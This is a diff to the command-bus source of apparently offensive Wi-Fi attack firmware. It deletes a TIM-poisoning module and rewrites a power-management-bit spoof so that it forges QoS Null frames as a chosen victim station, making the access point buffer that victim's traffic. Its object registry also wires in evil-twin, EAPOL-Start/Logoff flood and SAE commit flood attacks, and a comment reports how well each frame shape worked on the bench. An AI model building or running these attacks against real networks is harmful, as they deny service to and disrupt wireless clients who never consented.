@@ -19,10 +19,9 @@
 #include "delba.h"
 #include "eapol.h"
 #include "evil_twin.h"
-#include "pspoll.h"
+#include "qosnull.h"
 #include "radio.h"
 #include "sae.h"
-#include "tim.h"
 #include "wbus.h"
 #include "baitap.h"
 #include "btm.h"
@@ -529,19 +528,6 @@ const wb_method_t kBaMethods[] = {
 
 // ---- shared helpers ---------------------------------------------------------
 
-// The bus parses values, but PSPOLL's frame-shape words are free-form tokens that
-// need a case-insensitive compare. Keeping the helper here avoids exporting
-// str_ieq from the component.
-bool token_eq(const char* a, const char* b) {
-  if (a == nullptr || b == nullptr) return false;
-  while (*a != 0 && *b != 0) {
-    if (tolower((unsigned char)*a) != tolower((unsigned char)*b)) return false;
-    a++;
-    b++;
-  }
-  return *a == 0 && *b == 0;
-}
-
 void mac_text(const uint8_t mac[6], char out[18]) {
   snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4],
            mac[5]);
@@ -887,68 +873,6 @@ const wb_method_t kBaitapMethods[] = {
      .summary = "bait AP state and heap cost"},
 };
 
-// ---- TIM poisoning ----------------------------------------------------------
-
-const wb_arg_spec_t kTimStartArgs[] = {
-    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
-     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
-    {.name = "mode", .type = WB_T_ENUM, .flags = 0, .enums = "tim|clear",
-     .label = "tim = set the AID bit(s), clear = empty the bitmap",
-     .err = "mode must be tim|clear", .def = 0, .min = 0, .max = 0},
-    {.name = "aid", .type = WB_T_INT, .flags = 0, .enums = nullptr,
-     .label = "AID 0..255 (0 = every learned AID)", .err = nullptr, .def = 0, .min = 0, .max = 0},
-};
-
-wb_err_t tim_bus_start(const wb_args_t* args, wb_reply_t* reply) {
-  const int index = (int)wb_arg_num(args, "idx");
-  if (index < 0 || index >= console_scan_count()) {
-    wb_reply_line(reply, "ERR index out of range, run SCAN first");
-    return WB_ERR_ARG;
-  }
-  const wb_value_t* mode_arg = wb_arg(args, "mode");
-  const tim_mode_t mode =
-      (mode_arg != nullptr && mode_arg->text != nullptr && strcmp(mode_arg->text, "clear") == 0)
-          ? TIM_CLEAR
-          : TIM_SET;
-  const long aid = wb_arg_num(args, "aid");
-  if (aid < 0 || aid > 255) {
-    wb_reply_line(reply, "ERR aid must be 0..255 (0 = every learned AID)");
-    return WB_ERR_ARG;
-  }
-  attack_stop();
-  if (!tim_start(index, mode, (uint16_t)aid)) {
-    wb_reply_line(reply, "ERR cannot start the beacon clone on that network");
-    return WB_ERR_STATE;
-  }
-  wb_reply_printf(reply, "OK TIM %d mode=%s aid=%ld ch=%u\n", index, tim_mode_name(), aid,
-                  (unsigned)WiFi.channel(index));
-  console_ui_log("tim clone started");
-  wbus_emit("tim.state", "active=1");
-  return WB_OK;
-}
-
-wb_err_t tim_bus_stop(const wb_args_t*, wb_reply_t* reply) {
-  const uint32_t frames = tim_frames();
-  const uint32_t real = tim_real_beacons();
-  tim_stop();
-  wb_reply_printf(reply, "OK TIMSTOP frames=%u real_beacons=%u\n", (unsigned)frames, (unsigned)real);
-  console_ui_log("tim clone stopped");
-  wbus_emit("tim.state", "active=0");
-  return WB_OK;
-}
-
-wb_err_t tim_bus_test(const wb_args_t*, wb_reply_t*) {
-  tim_selftest();
-  return WB_OK;
-}
-
-const wb_method_t kTimMethods[] = {
-    {.name = "start", .args = kTimStartArgs, .n_args = 3, .handler = tim_bus_start,
-     .summary = "tamper the TIM element of a cloned beacon"},
-    {.name = "stop", .args = nullptr, .n_args = 0, .handler = tim_bus_stop, .summary = "stop the beacon clone"},
-    {.name = "test", .args = nullptr, .n_args = 0, .handler = tim_bus_test, .summary = "dump the cloned beacon (TIM check)"},
-};
-
 // ---- EAPOL-Start / Logoff flood ---------------------------------------------
 
 const wb_arg_spec_t kEapolStartArgs[] = {
@@ -1012,22 +936,17 @@ const wb_method_t kEapolMethods[] = {
     {.name = "test", .args = nullptr, .n_args = 0, .handler = eapol_bus_test, .summary = "dump the EAPOL data frames"},
 };
 
-// ---- PS bit (power management) spoof ----------------------------------------
+// ---- QoS Null PM-bit spoof --------------------------------------------------
 
-// Three free-form slots: the victim MAC and the frame shape may come in any order,
-// which is why they are WB_T_STR and classified here instead of by the policy.
-const wb_arg_spec_t kPspollStartArgs[] = {
+const wb_arg_spec_t kQosnullStartArgs[] = {
     {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
      .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
-    {.name = "a", .type = WB_T_STR, .flags = 0, .enums = nullptr,
-     .label = "sta-mac or null|qosnull|action", .err = nullptr, .def = 0, .min = 0, .max = 0},
-    {.name = "b", .type = WB_T_STR, .flags = 0, .enums = nullptr,
-     .label = "sta-mac or null|qosnull|action", .err = nullptr, .def = 0, .min = 0, .max = 0},
-    {.name = "c", .type = WB_T_STR, .flags = 0, .enums = nullptr,
-     .label = "sta-mac or null|qosnull|action", .err = nullptr, .def = 0, .min = 0, .max = 0},
+    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
+     .label = "victim MAC (empty = learn it from the sniffer)", .err = nullptr, .def = 0,
+     .min = 0, .max = 0},
 };
 
-wb_err_t pspoll_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+wb_err_t qosnull_bus_start(const wb_args_t* args, wb_reply_t* reply) {
   const int index = (int)wb_arg_num(args, "idx");
   if (index < 0 || index >= console_scan_count()) {
     wb_reply_line(reply, "ERR index out of range, run SCAN first");
@@ -1035,96 +954,78 @@ wb_err_t pspoll_bus_start(const wb_args_t* args, wb_reply_t* reply) {
   }
   uint8_t sta[6];
   bool have_sta = false;
-  // QoS Null is the default: it measured strongest on the bench (-38% vs -30% for
-  // plain Null Data and -21% for the Action shape, 测试报告 §4.4.10).
-  pspoll_frame_t shape = PSPOLL_FRAME_QOSNULL;
-  const char* names[3] = {"a", "b", "c"};
-  for (int i = 0; i < 3; i++) {
-    const wb_value_t* value = wb_arg(args, names[i]);
-    if (value == nullptr || !value->present || value->text == nullptr) continue;
-    const char* token = value->text;
-    if (token_eq(token, "null")) {
-      shape = PSPOLL_FRAME_NULL;
-    } else if (token_eq(token, "qosnull") || token_eq(token, "qos")) {
-      shape = PSPOLL_FRAME_QOSNULL;
-    } else if (token_eq(token, "action") || token_eq(token, "act")) {
-      shape = PSPOLL_FRAME_ACTION;
-    } else if (wb_parse_mac(token, sta)) {
-      // Tested before any numeric branch: "02AABBCCDDEE" starts with a digit.
-      have_sta = true;
-    } else {
-      wb_reply_printf(reply,
-                      "ERR unknown PSPOLL argument '%s' (usage: PSPOLL <idx> [sta-mac]"
-                      " [null|qosnull|action])\n",
-                      token);
+  const wb_value_t* sta_arg = wb_arg(args, "sta");
+  if (sta_arg != nullptr && sta_arg->present && sta_arg->text != nullptr &&
+      sta_arg->text[0] != 0) {
+    if (!wb_parse_mac(sta_arg->text, sta)) {
+      wb_reply_printf(reply, "ERR sta must be aa:bb:cc:dd:ee:ff, got '%s'\n", sta_arg->text);
       return WB_ERR_ARG;
     }
+    have_sta = true;
   }
   attack_stop();
-  if (!pspoll_start(index, shape)) {
+  if (!qosnull_start(index, have_sta ? sta : nullptr)) {
     wb_reply_line(reply, "ERR cannot start the PM-bit spoof on that network");
     return WB_ERR_STATE;
   }
   char sta_out[18];
   sta_out[0] = 0;
   if (have_sta) {
-    pspoll_add_station(sta);
     mac_text(sta, sta_out);
   }
-  const int32_t chan_err = pspoll_channel_err();
-  wb_reply_printf(reply, "OK PSPOLL %d mode=%s frame=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
-                  pspoll_mode_name(), pspoll_frame_name(),
-                  sta_out[0] ? sta_out : "learned", (unsigned)WiFi.channel(index), (int)chan_err,
-                  WiFi.SSID(index).c_str());
+  const int32_t chan_err = qosnull_channel_err();
+  wb_reply_printf(reply, "OK QOSNULL %d mode=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
+                  qosnull_mode_name(), sta_out[0] ? sta_out : "learned",
+                  (unsigned)WiFi.channel(index), (int)chan_err, WiFi.SSID(index).c_str());
   if (chan_err != 0) {
     wb_reply_printf(reply,
                     "WARN chset=%d: the channel change was refused (a scan still running?),"
                     " frames go out on the current channel\n",
                     (int)chan_err);
   }
-  console_ui_log("pm-bit spoof started");
-  wbus_emit("pspoll.state", "active=1");
+  console_ui_log("qos null pm spoof started");
+  wbus_emit("qosnull.state", "active=1");
   return WB_OK;
 }
 
-wb_err_t pspoll_bus_stop(const wb_args_t*, wb_reply_t* reply) {
-  const uint32_t frames = pspoll_frames();
-  const uint32_t nulls = pspoll_null_frames();
-  const uint32_t flushes = pspoll_flush_frames();
-  const uint32_t dl = pspoll_dl_frames();
-  pspoll_stop();
-  wb_reply_printf(reply, "OK PSPOLLSTOP frames=%u pm1=%u pm0=%u dl=%u\n", (unsigned)frames,
-                  (unsigned)nulls, (unsigned)flushes, (unsigned)dl);
-  console_ui_log("pm-bit spoof stopped");
-  wbus_emit("pspoll.state", "active=0");
+wb_err_t qosnull_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = qosnull_frames();
+  const uint32_t pm1 = qosnull_pm1_frames();
+  const uint32_t pm0 = qosnull_pm0_frames();
+  const uint32_t dl = qosnull_dl_frames();
+  qosnull_stop();
+  wb_reply_printf(reply, "OK QOSNULLSTOP frames=%u pm1=%u pm0=%u dl=%u\n", (unsigned)frames,
+                  (unsigned)pm1, (unsigned)pm0, (unsigned)dl);
+  console_ui_log("qos null pm spoof stopped");
+  wbus_emit("qosnull.state", "active=0");
   return WB_OK;
 }
 
-wb_err_t pspoll_bus_release(const wb_args_t*, wb_reply_t* reply) {
-  const uint32_t clients = pspoll_clients();
-  const uint32_t before = pspoll_flush_frames();
-  pspoll_release();
-  wb_reply_printf(reply, "OK PSPOLLREL clients=%u flushed=%u\n", (unsigned)clients,
-                  (unsigned)(pspoll_flush_frames() - before));
+wb_err_t qosnull_bus_release(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t clients = qosnull_clients();
+  const uint32_t before = qosnull_pm0_frames();
+  qosnull_release();
+  wb_reply_printf(reply, "OK QOSNULLREL clients=%u flushed=%u\n", (unsigned)clients,
+                  (unsigned)(qosnull_pm0_frames() - before));
   console_ui_log("pm=0 release sent");
-  wbus_emit("pspoll.state", "active=0");
+  wbus_emit("qosnull.state", "active=0");
   return WB_OK;
 }
 
-wb_err_t pspoll_bus_test(const wb_args_t*, wb_reply_t*) {
-  pspoll_selftest();
+wb_err_t qosnull_bus_test(const wb_args_t*, wb_reply_t*) {
+  qosnull_selftest();
   return WB_OK;
 }
 
-const wb_method_t kPspollMethods[] = {
-    {.name = "start", .args = kPspollStartArgs, .n_args = 4, .handler = pspoll_bus_start,
-     .summary = "PM-bit spoof: make the AP buffer a victim's downlink"},
-    {.name = "release", .args = nullptr, .n_args = 0, .handler = pspoll_bus_release,
+const wb_method_t kQosnullMethods[] = {
+    {.name = "start", .args = kQosnullStartArgs, .n_args = 2, .handler = qosnull_bus_start,
+     .summary = "forge a unicast QoS Null as a victim and flip the PM bit"},
+    {.name = "release", .args = nullptr, .n_args = 0, .handler = qosnull_bus_release,
      .summary = "send PM=0 to every victim, then stop"},
-    {.name = "stop", .args = nullptr, .n_args = 0, .handler = pspoll_bus_stop,
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = qosnull_bus_stop,
      .summary = "stop the PM-bit spoof without a release"},
-    {.name = "test", .args = nullptr, .n_args = 0, .handler = pspoll_bus_test,
-     .summary = "dump all three shapes (PM=1 / PM=0)"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = qosnull_bus_test,
+     .summary = "dump the QoS Null bytes (PM=1 / PM=0)"},
 };
 
 // ---- SAE commit flood -------------------------------------------------------
@@ -1464,20 +1365,15 @@ const wb_object_t kObjects[] = {
      .methods = kRrmMethods,
      .n_methods = (int)(sizeof(kRrmMethods) / sizeof(kRrmMethods[0])),
      .events = "state"},
-    {.name = "tim",
-     .title = "TIM poisoning (cloned beacon)",
-     .methods = kTimMethods,
-     .n_methods = (int)(sizeof(kTimMethods) / sizeof(kTimMethods[0])),
-     .events = "state"},
     {.name = "eapol",
      .title = "EAPOL-Start/Logoff flood",
      .methods = kEapolMethods,
      .n_methods = (int)(sizeof(kEapolMethods) / sizeof(kEapolMethods[0])),
      .events = "state"},
-    {.name = "pspoll",
-     .title = "PS bit (power management) spoof",
-     .methods = kPspollMethods,
-     .n_methods = (int)(sizeof(kPspollMethods) / sizeof(kPspollMethods[0])),
+    {.name = "qosnull",
+     .title = "QoS Null PM-bit spoof",
+     .methods = kQosnullMethods,
+     .n_methods = (int)(sizeof(kQosnullMethods) / sizeof(kQosnullMethods[0])),
      .events = "state"},
     {.name = "sae",
      .title = "SAE Commit flood",
